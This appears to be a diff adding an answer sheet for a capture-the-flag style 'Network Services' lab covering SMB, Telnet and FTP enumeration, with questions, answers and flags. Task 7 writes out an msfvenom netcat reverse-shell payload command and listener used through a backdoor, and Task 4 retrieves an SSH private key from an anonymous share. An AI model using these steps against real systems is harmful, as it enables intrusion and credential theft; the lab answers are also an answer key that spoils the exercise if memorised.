@@ -1,0 +1,196 @@
+Network Services
+
+TASK 2
+
+What does SMB stand for?    
+Server Message Block
+
+What type of protocol is SMB?    
+response-request
+
+What protocol suite do clients use to connect to the server?    
+TCP/IP
+
+What systems does Samba run on?
+Unix
+
+TASK 3
+
+Conduct an nmap scan of your choosing, How many ports are open?
+3
+
+What ports is SMB running on? Provide the ports in ascending order.
+139/445
+
+Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
+WORKGROUP
+
+What comes up as the name of the machine?        
+POLOSMB
+
+What operating system version is running?    
+6.1
+
+What share sticks out as something we might want to investigate?    
+profiles
+
+TASK 4
+
+What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
+smbclient //10.10.10.2/secret -U suit -p 445
+
+Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.
+
+Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
+
+- using the username "Anonymous"
+
+- connecting to the share we found during the enumeration stage
+
+- and not supplying a password.
+
+Does the share allow anonymous access? Y/N?
+Y
+
+Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
+John Cactus
+
+What service has been configured to allow him to work from home?
+ssh
+
+Okay! Now we know this, what directory on the share should we look in?
+.ssh
+
+This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
+id_rsa
+
+What is the smb.txt flag?
+THM{smb_is_fun_eh?}
+
+TASK 5
+
+Is Telnet a client-server protocol (Y/N)?
+Y
+
+What has slowly replaced Telnet?    
+SSH
+
+How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
+telnet 10.10.10.3 23
+
+The lack of what, means that all Telnet communication is in plaintext?
+encryption
+
+TASK 6
+
+How many ports are open on the lab machine?
+Note: you may need to scan non-standard ports too.
+1
+
+What port is this?
+8012
+
+This port is unassigned, but still lists the protocol it's using, what protocol is this?     
+tcp
+
+Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
+0
+
+Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
+No answer needed
+
+Based on the title returned to us, what do we think this port could be used for?
+a backdoor
+
+Correct Answer
+Who could it belong to? Gathering possible usernames is an important step in enumeration.
+Skidy
+
+TASK 7
+
+Great! It's an open telnet connection! What welcome message do we receive?
+SKIDY'S BACKDOOR.
+
+Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+N
+
+Start a tcpdump listener on your local machine.
+If using your own machine with the OpenVPN connection, use:
+sudo tcpdump ip proto \\icmp -i tun0
+If using the AttackBox, use:
+sudo tcpdump ip proto \\icmp -i ens5
+This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+
+
+Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+Y
+
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+What word does the generated payload start with?
+mkfifo
+
+Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+"nc -lvnp [listening port]"
+
+What would the command look like for the listening port we selected in our payload?
+nc -lvnp 4444
+
+Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the lab machine!
+No answer needed
+
+Success! What is the contents of flag.txt?
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+TASK 8
+
+What communications model does FTP use?
+client-server
+
+What's the standard FTP port?
+21
+
+How many modes of FTP connection are there?    
+2
+
+TASK 9
+
+Run an nmap scan of your choice.
+How many ports are open on the lab machine? 
+3
+
+What port is ftp running on?
+21
+
+What variant of FTP is running on it?  
+vsftpd
+
+Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted.
+What is the name of the file in the anonymous FTP directory?
+PUBLIC_NOTICE.txt
+
+What do we think a possible username
+could be?
+mike
+
+Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...
+No answer needed
+
+TASK 10
+
+What is the password for the user "mike"?
+password
+
+Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
+No answer needed
+
+What is ftp.txt?
+THM{y0u_g0t_th3_ftp_fl4g}
+
+
